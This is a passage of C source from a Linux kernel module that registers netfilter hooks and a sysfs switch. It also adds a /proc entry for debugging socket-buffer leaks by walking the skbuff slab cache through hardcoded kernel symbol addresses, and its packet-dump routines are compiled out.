            buf_len = snprintf(buf, sizeof(buf),"KNOWN[%d] skb p:%s\n", cnt, g_port_strs_list[pi].str);
            pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
            return 1;
        }
    }

    *_cnt = cnt;
    *fp_pos = pos;

    return 0;
}
#endif

#if 0
/*
 * @pi: portal type index.
 * @know : know it is a IP skb. 
 *    == 1 : it is a IP skb
 *    == 0 : maybe it is a IP skb
 * */
static int __s_show_tcp(struct sk_buff *skb, int cnt, struct log_file *lf, int pi, int know_ip)
{
    char buf[1024];
    int buf_len = 0;
    struct ethhdr  *eh = NULL;
    struct iphdr   *ip_h = NULL;
    struct tcphdr  *tcp_h = NULL;
    int s_len = 0;

    s_len = sizeof(buf);

    //if (skb->protocol == htons(ETH_P_IP) || know_ip == 0) {
    if (know_ip == 1 || know_ip == 0) {
        if (know_ip == 0) {
            eh = (struct ethhdr *)(skb->data);
        } else {
            eh = eth_hdr(skb);
        }
        if (skb->len >= 54) {
            if (know_ip == 0) {
                ip_h = (struct iphdr *)(eh + 1);
            } else {
                ip_h = ip_hdr(skb);
            }
            if (ip_h->protocol == IPPROTO_TCP) {
                tcp_h = (struct tcphdr *)((u8 *)ip_h + (ip_h->ihl << 2));
                buf_len = snprintf(buf, sizeof(buf),
                        "\n[%d]TCP:[IP_KNOW:%d][len:%d][%s][%d]dport:%d.dmac"MAC_FMT"|", 
                        cnt, know_ip, skb->len,
                        skb->leak_func, skb->leak_line,  /* need in kernel to add this item at "struct skb_buf" */
                        ntohs(tcp_h->dest),
                        MAC2STR(eh->h_dest)
                        );
                if (tcp_h->ack) {
                    buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                            "%s,", "ACK");
                }
                if (tcp_h->fin) {
                    buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                            "%s,", "FIN");
                }
                if (tcp_h->psh) {
                    buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                            "%s,", "PSH");
                }
                if (tcp_h->syn) {
                    buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                            "%s,", "SYN");
                }
                if (tcp_h->rst) {
                    buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                            "%s,", "RST");
                }
                buf_len += snprintf((buf + buf_len), (s_len - buf_len),
                        "|%s", "\n");
                s_write_2_file(lf, buf, buf_len);
                s_write_2_file(lf, skb->data, skb->len);

                return 0;
            }
        }

        buf_len = snprintf(buf, sizeof(buf),"KNOWN0[%4d]:%s:\tSRC:"MAC_FMT"\tDEST:"MAC_FMT"\n", 
                cnt, g_port_strs_list[pi].str, 
                MAC2STR(eh->h_source), 
                MAC2STR(eh->h_dest));
        s_write_2_file(lf, buf, buf_len);
        s_write_2_file(lf, skb->data, skb->len);

        return 0;
    }

    return -1;
}
#else
static int __s_show_tcp(struct sk_buff *skb, int cnt, struct log_file *lf, int pi, int know_ip)
{
    return 0;
}
#endif

#if 0
static int __s_show_obj(struct kmem_cache *cachep)
{
    //struct kmem_cache *cachep = list_entry(p, struct kmem_cache, next);
    struct slab *slabp;
    //unsigned long active_objs;
    //unsigned long num_objs;
    //unsigned long active_slabs = 0;
    //unsigned long num_slabs, free_objects = 0, shared_avail = 0;
    //const char *name;
    char *error = NULL;
    int node;
    struct kmem_list3 *l3;
    int index = 0;
    void *obj = NULL;
    struct sk_buff *skb = NULL;
    int pi = 0;
    struct ieee80211_frame *wh;
    int cnt = 0;
    int skb_user = 0;
    char buf[1024];
    int buf_len = 0;
    loff_t pos = 0;
    struct ethhdr  *eh = NULL;
    struct iphdr   *ip_h = NULL;
    struct tcphdr  *tcp_h = NULL;
    struct udphdr  *udp_h = NULL;
    __be16 d_protocol = 0, *d_p = NULL;
    int type = -1, subtype = -1;
    struct log_file lf;
    struct nf_conn *ct = NULL;
    enum ip_conntrack_info ctinfo;
    int nf_is_here = 0;

   
    memset(&lf, 0, sizeof(lf));

    //active_objs = 0;
    //num_slabs = 0;

    snprintf(lf.file_path, sizeof(lf.file_path), "%s", "/tmp/tfcard/slab_log2");
    g_log_fp = s_open_file(&lf);
    if (NULL == g_log_fp) {
        printk("[%s][%d]file open failed\n", __func__, __LINE__);
        return -1;
    }

    for_each_online_node(node) {
        l3 = cachep->nodelists[node];
        if (!l3)
            continue;

        check_irq_on();
        spin_lock_irq(&l3->list_lock);

        list_for_each_entry(slabp, &l3->slabs_full, list) {
            if (slabp->inuse != cachep->num && !error)
                error = "slabs_full accounting error";
            //active_objs += cachep->num;
            //active_slabs++;
            for(index = 0; index < cachep->num; index ++) {
                cnt ++;
                obj = index_to_obj(cachep, slabp, index);
                skb = (struct sk_buff *)obj;
#if 0
                if (__s_show_known_skb(skb, &pos, &cnt) != 0) {
                    continue;
                }
#endif
                for (pi = 0; pi < ARRAY_SIZE(g_port_strs_list); pi++) {
                    if (skb->protocol == htons(g_port_strs_list[pi].p)) {
                        //printk("KNOWN[%d] skb p:%s\n", cnt, g_port_strs_list[pi].str);
                        if (skb->protocol == htons(ETH_P_IP)) {
                            if (__s_show_tcp(skb, cnt, &lf, pi, 1) == 0) {
                                goto next_s;
                            }
                        }

                        buf_len = snprintf(buf, sizeof(buf),"\nKNOWN[%d] skb p:%s\n", cnt, g_port_strs_list[pi].str);
                        s_write_2_file(&lf, buf, buf_len);
                        s_write_2_file(&lf, skb->data, skb->len);
                        goto next_s;
                    }
                }

                if (skb->len >= (12 + 2)) {
                    d_p = (__be16 *)((skb->data) + 12);
                    d_protocol = *d_p;
                    for (pi = 0; pi < ARRAY_SIZE(g_port_strs_list); pi++) {
                        if (d_protocol == htons(g_port_strs_list[pi].p)) {
                            if (d_protocol == ETH_P_IP) {
                                if (__s_show_tcp(skb, cnt, &lf, pi, 0) == 0) {
                                    goto next_s;
                                }
                            }
                            buf_len = snprintf(buf, sizeof(buf),"\nKNOWN3[%d] skb p:%s\n", cnt, g_port_strs_list[pi].str);
                            pos = s_write_2_file(&lf, buf, buf_len);
                            pos = s_write_2_file(&lf, skb->data, skb->len);
                            goto next_s;
                        }
                    }
                }

#if 0
                if (skb->len >= 24) {
                    wh = (struct ieee80211_frame *)(skb->data);
                    type = wh->i_fc[0] & IEEE80211_FC0_TYPE_MASK;
                    subtype = wh->i_fc[0] & IEEE80211_FC0_SUBTYPE_MASK;

                    if (type == IEEE80211_FC0_TYPE_MGT) {
                        for (pi = 0; pi < ARRAY_SIZE(g_prot_str_list_w_mgt); pi++) {
                            if (subtype == htons(g_prot_str_list_w_mgt[pi].p)) {
#define W_PP 1
#if W_PP
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_MGT[%d][len%d] skb p:%s\n", cnt, skb->len,
                                        g_prot_str_list_w_mgt[pi].str);
#else
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_MGT[%d] skb p:%s MAC1:"MAC_FMT"\n", cnt, 
                                        g_prot_str_list_w_mgt[pi].str, MAC2STR(wh->i_addr1));
#endif
                                pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
                                pos = s_write_2_file(g_log_fp, skb->data, skb->len, pos);

                                goto next_s;
                            }
                        }
                    } else if (type == IEEE80211_FC0_TYPE_CTL) {
                        for (pi = 0; pi < ARRAY_SIZE(g_prot_str_list_w_ctl); pi++) {
                            if (subtype == htons(g_prot_str_list_w_ctl[pi].p)) {
#if W_PP
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_CTL[%d][len:%d] skb p:%s\n", cnt, skb->len,
                                        g_prot_str_list_w_ctl[pi].str);
#else
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_CTL[%d] skb p:%s MAC1:"MAC_FMT"\n", cnt, 
                                        g_prot_str_list_w_ctl[pi].str, MAC2STR(wh->i_addr1));
#endif
                                pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
                                pos = s_write_2_file(g_log_fp, skb->data, skb->len, pos);

                                /*
                                    buf_len = snprintf(buf, sizeof(buf),"[cnt:%d][len:%d]CTS:\n", cnt, skb->len);
                                    pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
                                    pos = s_write_2_file(g_log_fp, skb->data, skb->len, pos);
                                    */

                                goto next_s;
                            }
                        }
                    } else if (type == IEEE80211_FC0_TYPE_DATA) {
                        for (pi = 0; pi < ARRAY_SIZE(g_prot_str_list_w_data); pi++) {
                            if (subtype == htons(g_prot_str_list_w_data[pi].p)) {
#if W_PP
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_DAT[%d][%d] skb p:%s\n", cnt, skb->len,
                                        g_prot_str_list_w_data[pi].str);
#else
                                buf_len = snprintf(buf, sizeof(buf),"KNOWN_W_DAT[%d] skb p:%s MAC1:"MAC_FMT"\n", cnt, 
                                        g_prot_str_list_w_data[pi].str, MAC2STR(wh->i_addr1));
#endif
                                pos = s_write_2_file(g_log_fp, buf, buf_len, pos);
                                pos = s_write_2_file(g_log_fp, skb->data, skb->len, pos);

                                goto next_s;
                            }
                        }
                    }
                }
#endif

                /*
                   snprintf(buf, sizeof(buf), "wh[%d] sub fc:%02x%02x\n", cnt, 
                   (unsigned int)wh->i_fc[0],
                   (unsigned int)wh->i_fc[1]);
                   */

                nf_is_here = 0;
                ct = nf_ct_get(skb, &ctinfo);
                if (ct != NULL) {
                    nf_is_here = 1;
                }

                skb_user = atomic_read(&skb->users);
                buf_len = snprintf(buf, sizeof(buf), "\n[%d]UNKNOW[%s:%d][nf:%s]skb len:%d user:%d\n", 
                        cnt, skb->leak_func, skb->leak_line,
                        ((nf_is_here == 1) ? "FIND":"NOTHING"),
                        skb->len, skb_user);
                s_write_2_file(&lf, buf, buf_len);
                s_write_2_file(&lf, skb->data, skb->len);
next_s:
                continue;
            }
        }
        /*
           list_for_each_entry(slabp, &l3->slabs_partial, list) {
           if (slabp->inuse == cachep->num && !error)
           error = "slabs_partial inuse accounting error";
           if (!slabp->inuse && !error)
           error = "slabs_partial/inuse accounting error";
           active_objs += slabp->inuse;
           active_slabs++;
           }
           */

        spin_unlock_irq(&l3->list_lock);
    }

    if (g_log_fp) {
        s_close_file(&lf);
        g_log_fp = NULL;
    }
    return 0;
}
#else
static int __s_show_obj(struct kmem_cache *cachep)
{
    return 0;
}
#endif

struct skb_slab_info
{
    struct list_head next;
    char name[64];
    int  v;
};

static DEFINE_MUTEX(g_s_s_mutex);
struct list_head  g_s_s_head;

static void print_s_s_header(struct seq_file *m)
{
	/*
	 * Output format version, so at least we can change it
	 * without _too_ many complaints.
	 */
    /*
	seq_puts(m, "s_s - version: 2.1\n");
	seq_puts(m, "# name  "
		 " valude");
	seq_putc(m, '\n');
    */
}
static void *s_s_start(struct seq_file *m, loff_t *pos)
{
	loff_t n = *pos;

	mutex_lock(&g_s_s_mutex);
	if (!n)
		print_s_s_header(m);

	return seq_list_start(&g_s_s_head, *pos);
}


static void *s_s_next(struct seq_file *m, void *p, loff_t *pos)
{
	return seq_list_next(p, &g_s_s_head, pos);
}

static void s_s_stop(struct seq_file *m, void *p)
{
	struct kmem_cache *cachep = NULL;

	mutex_unlock(&g_s_s_mutex);

    mutex_lock(cache_chain_mutex);
    list_for_each_entry(cachep, cache_chain, next) {
        if (strncmp("skbuff_head_cache", cachep->name, strlen("skbuff_head_cache")) == 0) {
            printk("%s:%d name:%s\n", __func__, __LINE__, cachep->name);
            //__s_show(cachep);
            __s_show_obj(cachep);
        }
    }
    mutex_unlock(cache_chain_mutex);
}

static int s_s_show(struct seq_file *m, void *p)
{
    /*
	struct skb_slab_info *ssi  = list_entry(p, struct skb_slab_info, next);
    seq_printf(m, 
               "%8s %4d",
               ssi->name, 
               ssi->v);
    seq_putc(m, '\n');
    */

	return 0;
}
static const struct seq_operations s_slabinfo_op = {
	.start = s_s_start,
	.next = s_s_next,
	.stop = s_s_stop,
	.show = s_s_show,
};

static int s_slabinfo_open(struct inode *inode, struct file *file)
{
	return seq_open(file, &s_slabinfo_op);
}

ssize_t s_slabinfo_write(struct file *file, const char __user * buffer,
		       size_t count, loff_t *ppos)
{
    return 0;
}
static const struct file_operations s_slabinfo_operations = {
	.open		= s_slabinfo_open,
	.read		= seq_read,
	.write		= s_slabinfo_write,
	.llseek		= seq_lseek,
	.release	= seq_release,
};

static int ssi_add(const char * name, int v)
{
    struct skb_slab_info *ssi = NULL;

    ssi = vmalloc(sizeof(struct skb_slab_info));
    memset(ssi, 0, sizeof(struct skb_slab_info));

    snprintf(ssi->name, sizeof(ssi->name), "%s", name);
    ssi->v = v;

	mutex_lock(&g_s_s_mutex);
    list_add_tail(&(ssi->next), &g_s_s_head);
	mutex_unlock(&g_s_s_mutex);

    return 0;
}

static int slab_show(void)
{

    ssi_add("lang", 123);
    ssi_add("langl", 124);
    ssi_add("langlg", 1249);

    /*
     * cache_chain_mutex & cache_chain 是静态的变量，！
     * 解决办法。
     *
     * 编译完内核，对内核根目录下的vmlinux文件进行反汇编。
     * [lgg@mips-linux-2.6.31]$mips-linux-objdump vmlinux -D > 1
     * [lgg@mips-linux-2.6.31]$cat 1 | grep cache_chain
     * 8033ef0c <cache_chain_mutex>:
     * 80383024 <cache_chain>:
     *
     * 然后直接使用这两个地址试试，还真的可以。
     * */
    cache_chain_mutex = (struct mutex*)(void*)(unsigned int *)(unsigned int)(0x8033ef0c);//0x8033ef0c
    cache_chain = (struct list_head *)(void *)(unsigned int *)(unsigned int)(0x80383024); //0x80383024
	printk("cache_chain_mutex_addr = 0x%x\n", (unsigned int)cache_chain_mutex);
	printk("cache_chain_addr       = 0x%x\n", (unsigned int)cache_chain);

    /*
	struct kmem_cache *cachep = NULL;
    mutex_lock(cache_chain_mutex);
    list_for_each_entry(cachep, cache_chain, next) {
        printk("%s:%d name:%s\n", __func__, __LINE__, cachep->name);
    }
    mutex_unlock(cache_chain_mutex);
    */

	proc_create("s_slabinfo",S_IWUSR|S_IRUGO,NULL,&s_slabinfo_operations);

    return 0;
}

#define SYSFS_UP_ATTR "parameters"
typedef struct up_config
{
    unsigned char up_enable;
    spinlock_t up_lock/* = SPIN_LOCK_UNLOCKED*/;
}up_config_t;

static up_config_t g_up_config;

#define UP_CONFIG_LOCK \
    spin_lock(&(g_up_config.up_lock));
#define UP_CONFIG_UNLOCK \
    spin_unlock(&(g_up_config.up_lock));
 
static ssize_t 
show_up_enable(struct kobject *kobj, struct kobj_attribute *attr,
        char *buf)
{
    int rc = -1;
    UP_CONFIG_LOCK;
    rc = sprintf(buf, "%d\n", g_up_config.up_enable);
    UP_CONFIG_UNLOCK;
    return rc;
}

static ssize_t
store_up_enable(struct kobject *kobj, struct kobj_attribute *attr,
			  const char *buf, size_t count)
{
    int rc = -1, rv = 0;;
    rc = sscanf(buf, "%d\n", &rv);
    UP_CONFIG_LOCK;
    if (rc == 1) {
        if(rv)
            g_up_config.up_enable = 1;
        else
            g_up_config.up_enable = 0;
    }
    UP_CONFIG_UNLOCK;
    return strlen(buf);
}

#define UP_SYSFS_ATTR_SET(_name, _mode, _show, _store) \
        struct kobj_attribute up_sysfs_attr_##_name = __ATTR(_name, _mode, _show, _store)
static UP_SYSFS_ATTR_SET(up_enable, 
        (S_IRUGO | S_IWUSR),
        show_up_enable, 
        store_up_enable);

static struct attribute *up_attrs[] = {
    &(up_sysfs_attr_up_enable.attr),
    NULL,
};

static struct attribute_group up_sysfs_group = {
    .name = SYSFS_UP_ATTR,
    .attrs = up_attrs,
};

static int up_create_sysfs(void)
{
	struct kobject *up_obj = &(THIS_MODULE->mkobj.kobj);

    if (NULL == up_obj) {
        printk("[%s][%d]up obj is null\n", __func__, __LINE__);
        return -1;
    }

    sysfs_create_group(up_obj, &up_sysfs_group);

    return 0;
}

static int up_destroy_sysfs(struct kobject *up_obj)
{
    if (NULL == up_obj) {
        printk("[%s][%d]up obj is null\n", __func__, __LINE__);
    }

    sysfs_remove_group(up_obj, &up_sysfs_group);

    return 0;
}


static int __init up_init(void)
{
    int err = 0;
    up_link_init();
    UP_MSG_PRINTF("up link init success.");

    if (up_create_sysfs() < 0) {
        UP_MSG_PRINTF("%s: faild to create sysfs.\n", __func__);
        return -1;
    }

    err = nf_register_hooks(up_hooks, ARRAY_SIZE(up_hooks));
    if(0 != err){
        UP_MSG_PRINTF("%s: faild to register hook\n", __func__);
        return -1;
    }
    UP_MSG_PRINTF("nf register hooks success.");
    //up_report_data();
    
    memset(&g_up_config, 0, sizeof(up_config_t));
	spin_lock_init(&(g_up_config.up_lock));
    INIT_LIST_HEAD(&g_s_s_head);
    slab_show();
    UP_MSG_PRINTF("init success.");

    return 0;
}

static void __exit up_exit(void)
{
    struct skb_slab_info *p, *n;
	struct kobject *up_obj = &(THIS_MODULE->mkobj.kobj);
    nf_unregister_hooks(up_hooks, ARRAY_SIZE(up_hooks));
    up_destroy_sysfs(up_obj);
    up_link_fini();

    remove_proc_entry("s_slabinfo", NULL);

	mutex_lock(&g_s_s_mutex);
    list_for_each_entry_safe(p, n, &g_s_s_head, next) {
        list_del(&(p->next));
        vfree(p);
    }
	mutex_unlock(&g_s_s_mutex);

    UP_MSG_PRINTF("exit success.");
    return;
}

module_init(up_init);
module_exit(up_exit);
